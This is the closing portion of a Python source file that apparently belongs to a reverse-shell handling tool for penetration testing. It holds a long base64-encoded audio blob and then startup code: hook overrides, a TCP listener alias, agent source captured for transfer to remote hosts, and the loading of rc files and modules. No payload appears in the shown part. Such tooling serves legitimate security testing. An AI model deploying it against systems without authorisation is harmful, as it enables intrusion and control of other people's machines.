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VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV//PkZAAAAAGkAOAAAAAAA0gBwAAATEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVTEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
    """
}

# Python Agent code
GET_GLOB_SIZE = inspect.getsource(get_glob_size)
MESSENGER = inspect.getsource(Messenger)
STREAM = inspect.getsource(Stream)
AGENT = inspect.getsource(agent)

# Python modifications
original_input = input
input = my_input
sys.excepthook = custom_excepthook
threading.excepthook = custom_excepthook
tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
os.umask(0o007)
signal.signal(signal.SIGWINCH, WinResize)
keyboard_interrupt = signal.getsignal(signal.SIGINT)
try:
	import readline
	readline.parse_and_bind("tab: complete")
	default_readline_delims = readline.get_completer_delims()
except ImportError:
	readline = None
	default_readline_delims = None

## Create basic objects
core = Core()
menu = MainMenu(histfile=options.cmd_histfile, histlen=options.histlength)
start = menu.start
Listener = TCPListener

# Check for installed emojis
if not fonts_installed():
	logger.warning("For showing emojis please install 'fonts-noto-color-emoji'")

# Load peneloperc
load_rc()

# Load modules
load_modules()

if __name__ == "__main__":
	main()
